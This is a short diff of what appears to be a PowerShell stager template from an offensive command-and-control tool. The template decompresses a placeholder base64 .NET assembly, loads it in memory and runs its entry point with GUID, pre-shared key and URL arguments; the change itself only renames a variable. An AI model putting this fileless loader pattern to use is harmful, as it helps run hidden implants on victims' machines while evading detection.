@@ -1,4 +1,4 @@
-[string[]]$ST_args = @($Guid, $Psk, $Url)
+[string[]]$ARGS_NAME = @($Guid, $Psk, $Url)
 
 $EncodedCompressedFile = @'
 BASE64_ENCODED_ASSEMBLY
@@ -8,4 +8,4 @@ $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Conv
 $UncompressedFileBytes = New-Object Byte[](DATA_LENGTH)
 $DeflatedStream.Read($UncompressedFileBytes, 0, DATA_LENGTH) | Out-Null
 $asm = [Reflection.Assembly]::Load($UncompressedFileBytes)
-$asm.EntryPoint.Invoke($null, [object[]](,$ST_args))
+$asm.EntryPoint.Invoke($null, [object[]](,$ARGS_NAME))
